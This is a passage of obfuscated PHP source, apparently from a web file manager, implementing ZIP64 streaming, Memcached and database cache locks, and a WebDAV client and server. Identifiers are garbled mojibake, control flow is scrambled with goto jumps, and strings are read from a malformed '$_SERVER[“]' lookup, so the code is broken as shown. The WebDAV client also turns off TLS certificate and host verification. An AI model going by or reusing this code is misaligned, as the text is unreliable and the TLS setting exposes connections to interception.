$E”‚‡®‡ß«) { goto Bêõ«¸˜ô¿; BœŞ™ˆÀ¾: while (!feof($C´ë ²‚µˆ)) { $B¡ ’¾¥…Ù = fread($C´ë ²‚µˆ, 1048576); $this->send($B¡ ’¾¥…Ù); } fclose($C´ë ²‚µˆ); $AºÈİÜç•¾ = hexdec(hash_file($eí¼ˆÑ[2001], $E”‚‡®‡ß«)); goto cäéš·¸©Ó; f÷»Ê©›¦: $eŒ‘…¨Â©é = $this->addFileHeader($f‚¹–‚¨•£, $föÖ¨Ÿãé); $f´É˜Ø†„Ë = $FŞ¦œ…Øè = filesize($E”‚‡®‡ß«); $C´ë ²‚µˆ = fopen($E”‚‡®‡ß«, $eí¼ˆÑ[2000]); goto BœŞ™ˆÀ¾; cäéš·¸©Ó: $this->addFileFooter($f‚¹–‚¨•£, $föÖ¨Ÿãé, $AºÈİÜç•¾, $f´É˜Ø†„Ë, $FŞ¦œ…Øè, $eŒ‘…¨Â©é); goto B°Õ—ÂÍÄ¿; Bêõ«¸˜ô¿: $eí¼ˆÑ =& $_SERVER[“]; $f‚¹–‚¨•£ = $this->filterFilename($f‚¹–‚¨•£); $föÖ¨Ÿãé = static::METHOD_STORE; goto f÷»Ê©›¦; B°Õ—ÂÍÄ¿: } public function addFileFromStream($A‘ËËë½, $aá‚çí“†Ü) { goto FÅ¸Ïİ¾ö‰; cåË¼”Öã³: $this->addFileFooter($A‘ËËë½, $A¡ïëêŒÄ, $fŸÕ­»Äí, $cÎß¬âÄ¯‡, $b…‡Ñ„æ…ë, $b…ë‘æ•¸¬); goto b¶ËšãŒÛ¶; fæø¯óö: $dĞë©ŒÁÊç = hash_init($_SERVER[“][2001]); while (!feof($aá‚çí“†Ü)) { $F‚…´–Šò = fread($aá‚çí“†Ü, 1048576); hash_update($dĞë©ŒÁÊç, $F‚…´–Šò); $this->send($F‚…´–Šò); } $fŸÕ­»Äí = hexdec(hash_final($dĞë©ŒÁÊç)); goto cåË¼”Öã³; bõåÇŒÎˆˆ: fseek($aá‚çí“†Ü, 0, SEEK_END); $cÎß¬âÄ¯‡ = $b…‡Ñ„æ…ë = ftell($aá‚çí“†Ü); rewind($aá‚çí“†Ü); goto fæø¯óö; FÅ¸Ïİ¾ö‰: $A‘ËËë½ = $this->filterFilename($A‘ËËë½); $A¡ïëêŒÄ = static::METHOD_STORE; $b…ë‘æ•¸¬ = $this->addFileHeader($A‘ËËë½, $A¡ïëêŒÄ); goto bõåÇŒÎˆˆ; b¶ËšãŒÛ¶: } public function finish() { foreach ($this->files as $fè‹ÉŸºö›) { $this->addCdrFile($fè‹ÉŸºö›); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($e³…‰œ÷×ƒ, $F‘†öñĞŒ) { goto D¹ŒáŞÜÉ¼; F½ŒøéàŒà: return strlen($dÒÉ£Û˜õ) + $EÏŸ–—Ä¶Ô + strlen($Fâò‹—¾…); goto cù§‡¹–µ; CøòÜø´ôæ: $CÜ£‚‡ï¼© = $this->dosTime(time()); $bíÀÑ–·Ğ° = array(array($Cöé‘Ô„ç[2003], static::FILE_HEADER_SIGNATURE), array($Cöé‘Ô„ç[2004], static::ZIP_VERSION_64), array($Cöé‘Ô„ç[2004], 8), array($Cöé‘Ô„ç[2004], $F‘†öñĞŒ), array($Cöé‘Ô„ç[2003], $CÜ£‚‡ï¼©), array($Cöé‘Ô„ç[2003], 0), array($Cöé‘Ô„ç[2003], 4294967295), array($Cöé‘Ô„ç[2003], 4294967295), array($Cöé‘Ô„ç[2004], $EÏŸ–—Ä¶Ô), array($Cöé‘Ô„ç[2004], 32)); $Fí©Ÿ³¢ = array(array($Cöé‘Ô„ç[2004], 1), array($Cöé‘Ô„ç[2004], 28), array($Cöé‘Ô„ç[2005], 0), array($Cöé‘Ô„ç[2005], 0), array($Cöé‘Ô„ç[2005], 0), array($Cöé‘Ô„ç[2003], 0)); goto c³²Ñ†‘¦à; D¹ŒáŞÜÉ¼: $Cöé‘Ô„ç =& $_SERVER[“]; $e³…‰œ÷×ƒ = preg_replace($Cöé‘Ô„ç[2002], $Cöé‘Ô„ç[33], $e³…‰œ÷×ƒ); $EÏŸ–—Ä¶Ô = strlen($e³…‰œ÷×ƒ); goto CøòÜø´ôæ; c³²Ñ†‘¦à: $dÒÉ£Û˜õ = $this->packFields($bíÀÑ–·Ğ°); $Fâò‹—¾… = $this->packFields($Fí©Ÿ³¢); $this->send($dÒÉ£Û˜õ . $e³…‰œ÷×ƒ . $Fâò‹—¾…); goto F½ŒøéàŒà; cù§‡¹–µ: } protected function addFileFooter($D‘¦Áö‘’ˆ, $f·Õ«À°³‘, $fØ˜³Ü Òì, $Aù¨†°ö©‚, $BÏ¢‚·ã›¨, $BÃ¾ˆñè›) { $bæÈ‚î†”Ğ =& $_SERVER[“]; $Aë¶‹Ô…  = array(array($bæÈ‚î†”Ğ[2003], static::DATA_DESCRIPTOR_SIGNATURE), array($bæÈ‚î†”Ğ[2003], $fØ˜³Ü Òì), array($bæÈ‚î†”Ğ[2005], $Aù¨†°ö©‚), array($bæÈ‚î†”Ğ[2005], $BÏ¢‚·ã›¨)); $a¢‰÷ñ³õ = $this->packFields($Aë¶‹Ô… ); $this->send($a¢‰÷ñ³õ); $E°õ¢í¸ » = $BÃ¾ˆñè› + $Aù¨†°ö©‚ + $D¬¹æâ÷Œ; $this->addToCdr($D‘¦Áö‘’ˆ, $f·Õ«À°³‘, $fØ˜³Ü Òì, $Aù¨†°ö©‚, $BÏ¢‚·ã›¨, $E°õ¢í¸ »); } private function addToCdr($C’¹™´½­­, $c”â›å›‡, $CßàÔËÆ¼°, $d‡¢¢’ù®ß, $Cµ±å™¤ô, $D…ƒ¿¯ğ×) { $this->files[] = array($C’¹™´½­­, $c”â›å›‡, $CßàÔËÆ¼°, $d‡¢¢’ù®ß, $Cµ±å™¤ô, $this->ofs); $this->ofs += $D…ƒ¿¯ğ×; } protected function addCdrFile($d—ÌòÎ‰“ƒ) { goto aŞÏÑ¸–ÑÂ; Eæİœ‹ Õâ: $this->send($E©ã‹µ¦); $this->cdr_ofs += strlen($E©ã‹µ¦); goto Báç÷¶ã´„; FÃ«¶šŞÛÄ: $FÂ£‘ÌßŒ½ = $this->dosTime(time()); $CšÚöÙ•ª§ = array(array($c–äÏ‹‘èå[2003], static::CDR_FILE_SIGNATURE), array($c–äÏ‹‘èå[2004], static::ZIP_VERSION_64), array($c–äÏ‹‘èå[2004], static::ZIP_VERSION_64), array($c–äÏ‹‘èå[2004], 8), array($c–äÏ‹‘èå[2004], $Bá¯êÀ·ï ), array($c–äÏ‹‘èå[2003], $FÂ£‘ÌßŒ½), array($c–äÏ‹‘èå[2003], $Fù´œ‡’ä¦), array($c–äÏ‹‘èå[2003], 4294967295), array($c–äÏ‹‘èå[2003], 4294967295), array($c–äÏ‹‘èå[2004], strlen($føî¼ŒßÄ»)), array($c–äÏ‹‘èå[2004], 32), array($c–äÏ‹‘èå[2004], strlen($aºÚàµï™’)), array($c–äÏ‹‘èå[2004], 0), array($c–äÏ‹‘èå[2004], 0), array($c–äÏ‹‘èå[2003], 32), array($c–äÏ‹‘èå[2003], 4294967295)); $A¹Ï£‹ó¿ = array(array($c–äÏ‹‘èå[2004], 1), array($c–äÏ‹‘èå[2004], 28), array($c–äÏ‹‘èå[2005], $D¼­½¡ÉŒÓ), array($c–äÏ‹‘èå[2005], $d­Š®ÌåÂ), array($c–äÏ‹‘èå[2005], $CÄ©£…Š), array($c–äÏ‹‘èå[2003], 0)); goto F‡î¨¼ŠŞ; F‡î¨¼ŠŞ: $e¥‡„²×¼Ö = $this->packFields($CšÚöÙ•ª§); $eÌ×®¢¸Õì = $this->packFields($A¹Ï£‹ó¿); $E©ã‹µ¦ = $e¥‡„²×¼Ö . $føî¼ŒßÄ» . $aºÚàµï™’ . $eÌ×®¢¸Õì; goto Eæİœ‹ Õâ; aŞÏÑ¸–ÑÂ: $c–äÏ‹‘èå =& $_SERVER[“]; list($føî¼ŒßÄ», $Bá¯êÀ·ï , $Fù´œ‡’ä¦, $d­Š®ÌåÂ, $D¼­½¡ÉŒÓ, $CÄ©£…Š) = $d—ÌòÎ‰“ƒ; $aºÚàµï™’ = $c–äÏ‹‘èå[33]; goto FÃ«¶šŞÛÄ; Báç÷¶ã´„: } protected function addCdr64Eof() { goto aß±Åèˆë; aß±Åèˆë: $b«¨Ÿ«„§Å =& $_SERVER[“]; $d…îÈù“Òù = count($this->files); $BëÍÒëƒ–ƒ = $this->cdr_ofs; goto c˜Õ¼ŒñÃ; BíÁ‚ö«·ò: $this->send($AŠñ‚‹ƒ•); goto aÈîªÀ÷Ëò; c˜Õ¼ŒñÃ: $aÎ¢°§ = $this->ofs; $FäÊĞºøé· = array(array($b«¨Ÿ«„§Å[2003], static::ZIP64_CDR_EOF_SIGNATURE), array($b«¨Ÿ«„§Å[2005], 44), array($b«¨Ÿ«„§Å[2004], static::ZIP_VERSION_64), array($b«¨Ÿ«„§Å[2004], static::ZIP_VERSION_64), array($b«¨Ÿ«„§Å[2003], 0), array($b«¨Ÿ«„§Å[2003], 0), array($b«¨Ÿ«„§Å[2005], $d…îÈù“Òù), array($b«¨Ÿ«„§Å[2005], $d…îÈù“Òù), array($b«¨Ÿ«„§Å[2005], $BëÍÒëƒ–ƒ), array($b«¨Ÿ«„§Å[2005], $aÎ¢°§)); $AŠñ‚‹ƒ• = $this->packFields($FäÊĞºøé·); goto BíÁ‚ö«·ò; aÈîªÀ÷Ëò: } protected function addCdr64Locator() { goto E×­¯¤ãŠ; DŠ‚¡Ì‘: $this->send($e¯×å¬ÑÅ‹); goto E³ŞìÛê¡¢; E×­¯¤ãŠ: $F¤øùœš»¿ =& $_SERVER[“]; $e—»Å´Ñ‹Å = count($this->files); $eîÚâ²äØö = $this->cdr_ofs; goto CÕôÀ—ŞÇ–; CÕôÀ—ŞÇ–: $bÏ–ƒÒ‰À‘ = $this->ofs; $fÃäùç¸“ = array(array($F¤øùœš»¿[2003], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($F¤øùœš»¿[2003], 0), array($F¤øùœš»¿[2005], $bÏ–ƒÒ‰À‘ + $eîÚâ²äØö), array($F¤øùœš»¿[2003], 1)); $e¯×å¬ÑÅ‹ = $this->packFields($fÃäùç¸“); goto DŠ‚¡Ì‘; E³ŞìÛê¡¢: } protected function addCdrEof() { goto F§Ššš„÷; C…„ºŞ²Ú­: $c´¼ëíçæ¹ = $this->packFields($eğ“‰Ö‡Ã²) . $eŠšÊ; $this->send($c´¼ëíçæ¹); goto BËØ–Ä¸áì; F§Ššš„÷: $fŒÀğ¶´Ç­ =& $_SERVER[“]; $cÉ¿é‹Ó–® = count($this->files); $Eñ¦Ğí–™ = $this->cdr_ofs; goto A‚ÉäÃØğğ; A‚ÉäÃØğğ: $eÅÓ›Å†¬‹ = $this->ofs; $eŠšÊ = $fŒÀğ¶´Ç­[33]; $eğ“‰Ö‡Ã² = array(array($fŒÀğ¶´Ç­[2003], static::CDR_EOF_SIGNATURE), array($fŒÀğ¶´Ç­[2004], 0), array($fŒÀğ¶´Ç­[2004], 0), array($fŒÀğ¶´Ç­[2004], $cÉ¿é‹Ó–®), array($fŒÀğ¶´Ç­[2004], $cÉ¿é‹Ó–®), array($fŒÀğ¶´Ç­[2003], 4294967295), array($fŒÀğ¶´Ç­[2003], 4294967295), array($fŒÀğ¶´Ç­[2004], strlen($eŠšÊ))); goto C…„ºŞ²Ú­; BËØ–Ä¸áì: } protected function addCdr() { foreach ($this->files as $A°Å‰»‰Å†) { $this->addCdrFile($A°Å‰»‰Å†); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $bµÂ¥ùÒÔö =& $_SERVER[“]; $dö’£²Ô¾ = $bµÂ¥ùÒÔö[202]; if ($this->outputName) { $b…ÛİğïØ“ = trim(str_replace(array($bµÂ¥ùÒÔö[113], $bµÂ¥ùÒÔö[55], $bµÂ¥ùÒÔö[93], $bµÂ¥ùÒÔö[67], $bµÂ¥ùÒÔö[217], $bµÂ¥ùÒÔö[979]), $bµÂ¥ùÒÔö[33], $this->outputName)); $D—ñØÀç¼ = rawurlencode($b…ÛİğïØ“); $dö’£²Ô¾ .= "\73\x20\x66\151\x6c\145\x6e\x61\155\x65\x2a\x3d\x75\x74\146\55\70\47\47{$D—ñØÀç¼}"; } $bï¬”¸¢‡ = array($bµÂ¥ùÒÔö[199] => $bµÂ¥ùÒÔö[2006], $bµÂ¥ùÒÔö[2007] => $dö’£²Ô¾, $bµÂ¥ùÒÔö[2008] => $bµÂ¥ùÒÔö[2009], $bµÂ¥ùÒÔö[2010] => $bµÂ¥ùÒÔö[2011], $bµÂ¥ùÒÔö[2012] => $bµÂ¥ùÒÔö[2013]); foreach ($bï¬”¸¢‡ as $E‹³İÄ–† => $dô¤•¶º½) { header($E‹³İÄ–† . $bµÂ¥ùÒÔö[866] . $dô¤•¶º½); } } protected function send($dìÈŒôÀÛš) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $dìÈŒôÀÛš); } protected final function dosTime($b¡Ş¡İí´Î) { $F‹¨¾†™ìÈ =& $_SERVER[“]; $Dİèäí‚…˜ = getdate($b¡Ş¡İí´Î); if ($Dİèäí‚…˜[$F‹¨¾†™ìÈ[1712]] < 1980) { $Dİèäí‚…˜ = array($F‹¨¾†™ìÈ[1712] => 1980, $F‹¨¾†™ìÈ[2014] => 1, $F‹¨¾†™ìÈ[2015] => 1, $F‹¨¾†™ìÈ[2016] => 0, $F‹¨¾†™ìÈ[2017] => 0, $F‹¨¾†™ìÈ[2018] => 0); } $Dİèäí‚…˜[$F‹¨¾†™ìÈ[1712]] -= 1980; return $Dİèäí‚…˜[$F‹¨¾†™ìÈ[1712]] << 25 | $Dİèäí‚…˜[$F‹¨¾†™ìÈ[2014]] << 21 | $Dİèäí‚…˜[$F‹¨¾†™ìÈ[2015]] << 16 | $Dİèäí‚…˜[$F‹¨¾†™ìÈ[2016]] << 11 | $Dİèäí‚…˜[$F‹¨¾†™ìÈ[2017]] << 5 | $Dİèäí‚…˜[$F‹¨¾†™ìÈ[2018]] >> 1; } protected function packFields($a¨ÆÒ”ªğò) { $DâÛ¡Ö’« =& $_SERVER[“]; $cÙ†è»¸±é = $DâÛ¡Ö’«[33]; $bæ¢±å¹´ã = array(); foreach ($a¨ÆÒ”ªğò as $E¬Èã«ìì‘) { $cÙ†è»¸±é .= $E¬Èã«ìì‘[0]; $bæ¢±å¹´ã[] = $E¬Èã«ìì‘[1]; } array_unshift($bæ¢±å¹´ã, $cÙ†è»¸±é); return call_user_func_array($DâÛ¡Ö’«[2019], $bæ¢±å¹´ã); } protected function filterFilename($aµš‰Ğå’ô) { $f­­éä”ÀÈ =& $_SERVER[“]; return str_replace(array($f­­éä”ÀÈ[93], $f­­éä”ÀÈ[4], $f­­éä”ÀÈ[176], $f­­éä”ÀÈ[69], $f­­éä”ÀÈ[113], $f­­éä”ÀÈ[911], $f­­éä”ÀÈ[914], $f­­éä”ÀÈ[271]), $f­­éä”ÀÈ[70], $aµš‰Ğå’ô); } } goto a‰¬¸ÒØ¸ñ; Få×µÎÖ˜Ì: class CacheLockMemcached { public function lock($b¶¶µİ½Ìî, $b˜†Öˆ©°ê = 0) { $B”ß¯´ÒÙ = Cache::init(); $CŠëŞ°·­º = microtime(!0) + $b˜†Öˆ©°ê; while (microtime(!0) < $CŠëŞ°·­º) { $b£äË”ãé = $B”ß¯´ÒÙ->get($b¶¶µİ½Ìî); if (!$b£äË”ãé || $b£äË”ãé < microtime(!0)) { $C£ÀÅÆÔ­» = $B”ß¯´ÒÙ->handle->add($b¶¶µİ½Ìî, $CŠëŞ°·­º, $b˜†Öˆ©°ê); if ($C£ÀÅÆÔ­») { return !0; } } cacheLockWait(); } return !1; } public function lockGet($AïË°œëê‘) { return Cache::init()->get($AïË°œëê‘); } public function unlock($cÙŒ†Óóš¿) { return Cache::init()->remove($cÙŒ†Óóš¿); } } class CacheLockDatabase { public function lock($a„ÀÂ“¾Šó, $B…¿‰÷ƒ’‰ = 0) { $eßìåíº´ = Model($_SERVER[“][740]); $D©İ°ö‘Åù = microtime(!0) + $B…¿‰÷ƒ’‰; while (microtime(!0) < $D©İ°ö‘Åù) { $a”ÛÀÈãİÖ = $eßìåíº´->get($a„ÀÂ“¾Šó); if (!$a”ÛÀÈãİÖ || $a”ÛÀÈãİÖ < microtime(!0)) { $cšÛ„‘Ã¢ø = $eßìåíº´->set($a„ÀÂ“¾Šó, $D©İ°ö‘Åù); if ($cšÛ„‘Ã¢ø) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($D·»˜ Ù¡) { return Model($_SERVER[“][740])->get($D·»˜ Ù¡); } public function unlock($fˆêÏ¥Œ´‹) { Model($_SERVER[“][740])->remove($fˆêÏ¥Œ´‹); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Då•ªÅ¾Ñ÷, $AƒëĞ•¾š) { $fá’É˜ß =& $_SERVER[“]; if (!class_exists($fá’É˜ß[761])) { show_json($fá’É˜ß[762], !1); } $this->cacheTime = $AƒëĞ•¾š; $this->handle = new Memcached(); if (is_array($Då•ªÅ¾Ñ÷[$fá’É˜ß[763]]) && count($Då•ªÅ¾Ñ÷[$fá’É˜ß[763]]) >= 1) { foreach ($Då•ªÅ¾Ñ÷[$fá’É˜ß[763]] as $d‡Ø†ÆìˆØ) { $BÕò¶Âåòñ = explode($fá’É˜ß[4], $d‡Ø†ÆìˆØ); $this->handle->addServer($BÕò¶Âåòñ[0], $BÕò¶Âåòñ[1]); } } else { $this->handle->addServer($Då•ªÅ¾Ñ÷[$fá’É˜ß[169]], $Då•ªÅ¾Ñ÷[$fá’É˜ß[170]]); } } public function set($B”Ùé‹“‚à, $E¶²°İª¾, $fÏ°¯£òÌæ = false) { $fÏ°¯£òÌæ = $fÏ°¯£òÌæ ? $fÏ°¯£òÌæ : $this->cacheTime; return $this->handle->set($B”Ùé‹“‚à, $E¶²°İª¾, $fÏ°¯£òÌæ); } public function get($fÌ×Ó·õ ) { return $this->handle->get($fÌ×Ó·õ ); } public function remove($fİØÑ°«¾÷) { return $this->handle->delete($fİØÑ°«¾÷); } public function deleteAll() { return $this->handle->flush(); } } goto AÍïä¯²ğ; b¤ìÕƒ„³¾: class HttpDavClient { public function __construct($d®‰¬×ÚÚù, $c°˜¹øÄÅ, $bºêÍ‘ÂÅ¥) { $this->header = array(); $this->userName = $c°˜¹øÄÅ; $this->userPassowrd = $bºêÍ‘ÂÅ¥; } protected function makePath($E±¥¸·»‹) { return $E±¥¸·»‹; } protected function setHeader($B„Ö³Å´ƒ¹, $cÈöàÄö‡… = false) { if ($cÈöàÄö‡… === !1) { $this->header[] = $B„Ö³Å´ƒ¹; } else { $this->header[] = $B„Ö³Å´ƒ¹ . $_SERVER[“][866] . $cÈöàÄö‡…; } } public function move($cƒÊ¸Ù”•Ã, $B›ã‡í÷Èš, $B„Š­´ˆ¼à = '') { $cÒÎ¿ÏÏ† =& $_SERVER[“]; $this->setHeader($cÒÎ¿ÏÏ†[1757], $this->makePath($B›ã‡í÷Èš)); $this->setHeader($cÒÎ¿ÏÏ†[1758], $cÒÎ¿ÏÏ†[1759]); if ($B„Š­´ˆ¼à) { $this->setHeader($cÒÎ¿ÏÏ†[1760], $cÒÎ¿ÏÏ†[911] . $B„Š­´ˆ¼à . $cÒÎ¿ÏÏ†[914]); } return $this->send($cÒÎ¿ÏÏ†[1761], $cƒÊ¸Ù”•Ã); } public function copy($D¨ôß§«Í¯, $cµ¸¸…ªÜ¼) { $dà‰¶ä­ =& $_SERVER[“]; $this->setHeader($dà‰¶ä­[1757], $this->makePath($cµ¸¸…ªÜ¼)); $this->setHeader($dà‰¶ä­[1758], $dà‰¶ä­[1759]); return $this->send($dà‰¶ä­[1762], $D¨ôß§«Í¯); } public function mkcol($fĞÇËƒ¼) { $a’ğ‘¶Âå½ =& $_SERVER[“]; $this->setHeader($a’ğ‘¶Âå½[1758], $a’ğ‘¶Âå½[1759]); return $this->send($a’ğ‘¶Âå½[1763], $fĞÇËƒ¼); } public function delete($eÒÕ×÷¨Ì, $Dè´ÆÅåÕ = '') { $cç¸™ª¼Ì¯ =& $_SERVER[“]; if ($Dè´ÆÅåÕ) { $this->setHeader($cç¸™ª¼Ì¯[1760], $cç¸™ª¼Ì¯[911] . $Dè´ÆÅåÕ . $cç¸™ª¼Ì¯[914]); } return $this->send($cç¸™ª¼Ì¯[1238], $eÒÕ×÷¨Ì); } public function propfind($Fãò‘Á¨Ğ) { $AĞªß¥ªŒº =& $_SERVER[“]; $this->setHeader($AĞªß¥ªŒº[1764], $AĞªß¥ªŒº[83]); $this->setHeader($AĞªß¥ªŒº[1765], $AĞªß¥ªŒº[1766]); $eÃ —÷Ïô = $AĞªß¥ªŒº[1767]; return $this->send($AĞªß¥ªŒº[1768], $Fãò‘Á¨Ğ, $eÃ —÷Ïô); } public function options($d¼Ş¿»Ú·ä) { return $this->send($_SERVER[“][1769], $d¼Ş¿»Ú·ä); } public function get($b¥ø†‹ÒÈ‚) { return $this->send($_SERVER[“][216], $b¥ø†‹ÒÈ‚); } public function put($B‚©ñìì«º, $fšÒÈãí¡¡, $aª®Ô˜„—á = '') { $bŸÔÈÖ²äÜ =& $_SERVER[“]; if ($aª®Ô˜„—á) { $this->setHeader($bŸÔÈÖ²äÜ[1760], $bŸÔÈÖ²äÜ[911] . $aª®Ô˜„—á . $bŸÔÈÖ²äÜ[914]); } return $this->send($bŸÔÈÖ²äÜ[214], $B‚©ñìì«º, $fšÒÈãí¡¡); } protected function send($EÏåµ¾Î¶, $aĞ²£†¬ÜÒ, $DëÎéˆÁó = false, $DÆÓÔØÚ‚‡ = false) { goto A‘ëå„Ş‡£; F²³ë¥•ß¬: curl_setopt($d×•Çùá‚…, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($d×•Çùá‚…, CURLOPT_SSL_VERIFYHOST, !1); $E©Ñæƒ„Û = curl_exec($d×•Çùá‚…); goto F¸‹ Æ‚ã¡; cÙ‰îÖáŠÃ: $this->setHeader($E¹š¶İçèŞ); if ($DëÎéˆÁó) { $DëÎéˆÁó = $DçŒ“Óáòô[1771] . $DëÎéˆÁó; } if (!request_url_safe($aĞ²£†¬ÜÒ)) { return !1; } goto e—ò‘¨²·; A‘ëå„Ş‡£: $DçŒ“Óáòô =& $_SERVER[“]; $E¹š¶İçèŞ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($DçŒ“Óáòô[1770], $DçŒ“Óáòô[50]); goto cÙ‰îÖáŠÃ; F¸‹ Æ‚ã¡: $this->header = array(); return $E©Ñæƒ„Û; goto c³ïùŸÁÃ; e—ò‘¨²·: $d×•Çùá‚… = curl_init($aĞ²£†¬ÜÒ); curl_setopt($d×•Çùá‚…, CURLOPT_CUSTOMREQUEST, $EÏåµ¾Î¶); curl_setopt($d×•Çùá‚…, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto Aæàå¯ÓÊ; Aæàå¯ÓÊ: curl_setopt($d×•Çùá‚…, CURLOPT_HTTPHEADER, $this->header); curl_setopt($d×•Çùá‚…, CURLOPT_RETURNTRANSFER, !0); curl_setopt($d×•Çùá‚…, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto F²³ë¥•ß¬; c³ïùŸÁÃ: } } class HttpDavServer { public function __construct($C¶‘í–ˆ, $e…Œæˆ²Şô) { $this->root = $C¶‘í–ˆ; $this->initPath($e…Œæˆ²Şô); $this->start(); } public function initPath($còÌÜ™ãÜ) { $c”­»Í¬ˆÑ =& $_SERVER[“]; $E¡î–´›Á¶ = rtrim($_SERVER[$c”­»Í¬ˆÑ[1373]], $c”­»Í¬ˆÑ[8]) . $c”­»Í¬ˆÑ[8]; $this->urlBase = substr($E¡î–´›Á¶, 0, strpos($E¡î–´›Á¶, $còÌÜ™ãÜ) + 1); $this->urlBase = rtrim($this->urlBase, $c”­»Í¬ˆÑ[8]) . $còÌÜ™ãÜ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $EÀ§‘’•Ê“ =& $_SERVER[“]; $fäñäÂ‰Òì = HttpAuth::get(); if ($fäñäÂ‰Òì[$EÀ§‘’•Ê“[537]] == $EÀ§‘’•Ê“[1772] && $fäñäÂ‰Òì[$EÀ§‘’•Ê“[883]] == $EÀ§‘’•Ê“[1773]) { return !0; } HttpAuth::error(); } public function start() { goto B³ï¾ÕôÖª; D™‡„ÏÏÖ: if (!method_exists($this, $c¡î¬Ô£™Ù)) { pr($c¡î¬Ô£™Ù . $Bğ“èÌ­Ù«[1774]); die; } $aÆŒ‰ë‡Óö = array($Bğ“èÌ­Ù«[1775], $Bğ“èÌ­Ù«[1776]); if (!in_array($c¡î¬Ô£™Ù, $aÆŒ‰ë‡Óö) && !$this->pathExists($this->path)) { $Cá‡Ôöô¸¸ = array($Bğ“èÌ­Ù«[1019] => 404); } else { $Cá‡Ôöô¸¸ = $this->{$c¡î¬Ô£™Ù}(); } goto F‚»ÆŸñ•µ; F‚»ÆŸñ•µ: if (!$Cá‡Ôöô¸¸) { return; } self::response($Cá‡Ôöô¸¸); goto AğˆŒ™ºõ—; B³ï¾ÕôÖª: $Bğ“èÌ­Ù« =& $_SERVER[“]; $this->checkUser(); $c¡î¬Ô£™Ù = $Bğ“èÌ­Ù«[144] . HttpHeader::method(); goto D™‡„ÏÏÖ; AğˆŒ™ºõ—: } public function pathGet($A¬„‡«Ë„Ã = false) { $BÈØ…‡ù„ =& $_SERVER[“]; $D¿›´éÈ§º = $A¬„‡«Ë„Ã ? $_SERVER[$BÈØ…‡ù„[1777]] : $_SERVER[$BÈØ…‡ù„[1373]]; $D¿›´éÈ§º = KodIO::clear(rawurldecode($D¿›´éÈ§º)); if (!strstr($D¿›´éÈ§º, KodIO::clear($this->urlBase))) { return !1; } return substr($D¿›´éÈ§º, strpos($D¿›´éÈ§º, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aŠ£•ö¦ƒ®) { return file_exists($aŠ£•ö¦ƒ®); } public function pathMkdir($b›å±É–÷‰) { return mkdir($b›å±É–÷‰, 511, !0); } public function pathInfo($BÃÁŒÊ‘Ôö) { return path_info($BÃÁŒÊ‘Ôö); } public function pathList($cÜë‘ğ…¤ñ) { return path_list($cÜë‘ğ…¤ñ); } public function pathOut($aí›ÖÌîğ) { echo file_get_contents($aí›ÖÌîğ); } public function pathPut($eÒïŞò—‡, $cÑ°ã˜™é¤ = '') { if (!$cÑ°ã˜™é¤) { return file_put_contents($eÒïŞò—‡, $_SERVER[“][33]); } return move_path($cÑ°ã˜™é¤, $eÒïŞò—‡); } public function pathRemove($có‹½á£ìŞ) { if (is_file($có‹½á£ìŞ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($cÊŸçã»«œ, $a÷ÃÔ¼Ÿ©) { return move_path($cÊŸçã»«œ, $a÷ÃÔ¼Ÿ©); } public function pathCopy($D¥ÍÛŒÙà¿, $bÛÀßÕäïÖ) { return copy_dir($D¥ÍÛŒÙà¿, $bÛÀßÕäïÖ); } public function parsePath($A¢®¾Ó¨”) { return $A¢®¾Ó¨”; } public function parseItem($E×Ì¹Ï’–‡, $Fš‹ñ—óŞ½) { goto fÚËŒ«Ññ; fÚËŒ«Ññ: $D®­“è’š =& $_SERVER[“]; $d¦—”¥Á’ = $this->pathGet() . $D®­“è’š[8] . $E×Ì¹Ï’–‡[$D®­“è’š[28]]; $d¦—”¥Á’ = $D®­“è’š[8] . str_replace($D®­“è’š[172], $D®­“è’š[8], rawurlencode($d¦—”¥Á’)); goto fóåñ¹±; fóåñ¹±: if ($Fš‹ñ—óŞ½) { $d¦—”¥Á’ = $D®­“è’š[8] . str_replace($D®­“è’š[172], $D®­“è’š[8], rawurlencode($this->pathGet())); } if (!trim($E×Ì¹Ï’–‡[$D®­“è’š[107]])) { $E×Ì¹Ï’–‡[$D®­“è’š[107]] = time(); } if (!trim($E×Ì¹Ï’–‡[$D®­“è’š[187]])) { $E×Ì¹Ï’–‡[$D®­“è’š[187]] = time(); } goto f…ÄÊÙŒ¯; f…ÄÊÙŒ¯: $Aè‰Êì™©¹ = array($D®­“è’š[1778] => KodIO::clear($this->urlBase . $d¦—”¥Á’), $D®­“è’š[107] => @gmdate($D®­“è’š[1779], $E×Ì¹Ï’–‡[$D®­“è’š[107]]), $D®­“è’š[187] => @gmdate($D®­“è’š[1780], $E×Ì¹Ï’–‡[$D®­“è’š[187]]), $D®­“è’š[77] => $E×Ì¹Ï’–‡[$D®­“è’š[77]] ? $E×Ì¹Ï’–‡[$D®­“è’š[77]] : 0); return $Aè‰Êì™©¹; goto B½¡”î£; B½¡”î£: } public function parseItemXml($Aæç÷Áç‰, $eˆ™¡É‰¸Â) { $A©ÇœåöÅ‘ =& $_SERVER[“]; $FçÎ«Êˆàˆ = $this->parseItem($Aæç÷Áç‰, $eˆ™¡É‰¸Â); if ($Aæç÷Áç‰[$A©ÇœåöÅ‘[29]] == $A©ÇœåöÅ‘[76]) { $aÊàéÛíº› = $A©ÇœåöÅ‘[1781]; $aÊàéÛíº› .= $A©ÇœåöÅ‘[1782]; } else { $aáŠÜà«Ù­ = $Aæç÷Áç‰[$A©ÇœåöÅ‘[160]] ? $Aæç÷Áç‰[$A©ÇœåöÅ‘[160]] : get_path_ext($Aæç÷Áç‰[$A©ÇœåöÅ‘[28]]); $CĞ¯ ÍçÜœ = get_file_mime($aáŠÜà«Ù­); $aÊàéÛíº› = $A©ÇœåöÅ‘[1783]; 